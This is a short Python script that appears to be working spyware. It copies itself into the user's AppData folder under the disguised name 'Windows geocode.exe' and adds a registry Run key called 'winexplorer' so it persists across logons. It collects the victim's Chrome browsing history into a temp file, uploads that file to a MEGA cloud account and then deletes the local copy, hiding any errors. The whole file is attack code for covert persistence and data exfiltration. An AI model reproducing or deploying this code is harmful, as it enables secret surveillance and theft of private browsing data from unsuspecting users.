from browser_history.browsers import Chrome
from os import remove , path , chdir , environ , getcwd
from datetime import datetime
from mega import Mega
from time import sleep
import shutil , subprocess ,sys
def reg_windows():
	evil_file_location = environ["appdata"] + "\\Windows geocode.exe"
	if not path.exists(evil_file_location):
		shutil.copyfile(sys.executable, evil_file_location)
		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
reg_windows()
def Mido():
	
	f = Chrome()
	outputs = f.fetch_history()
	paTh = chdir(environ["temp"])
	x = open("history.txt", mode="a")
	his = outputs.histories
	for i in his:
		x.writelines(i[1]+"\n\n")
	x.close()
def up(email, password):
	Mido()
	mega = Mega()
	try:
		m = mega.login(email, password)
		mega.upload('history.txt')
	except Exception as e:
		#print(e)
		sleep(120)
	remove("history.txt")
